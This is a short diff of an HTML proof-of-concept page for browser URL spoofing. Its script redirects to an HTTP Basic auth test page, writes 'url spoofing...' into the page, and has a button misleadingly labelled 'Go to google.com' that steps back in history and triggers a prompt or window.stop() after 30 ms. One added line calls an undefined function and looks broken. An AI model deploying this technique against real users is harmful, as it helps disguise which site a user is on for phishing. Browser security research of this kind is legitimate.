@@ -3,7 +3,7 @@
 <html>
 <body>
 <script>
-        v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';x.location = 'https://www.youtube.com'`);
+        v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';`);
         i = setInterval(`
             x.document.write("<h1>url spoofing...</h1>");
             clearInterval(v);
@@ -15,6 +15,7 @@
         
 Enter your name: <input type="text" name="firstname" value=""><br>
 </form> 
-        <input onclick="setInterval(function(){window.history.go(-1);prompt()}, 30);" type="button" value="Go to google.com" />
+        <input onclick="setTimeout(function(){window.history.go(-1);window.stop();}, 30);" type="button" value="Go to google.com" />
+        <input onclick="se(function(){window.stop();}, 30);" type="button" value="window.stop()" />
 </body>
 </html>
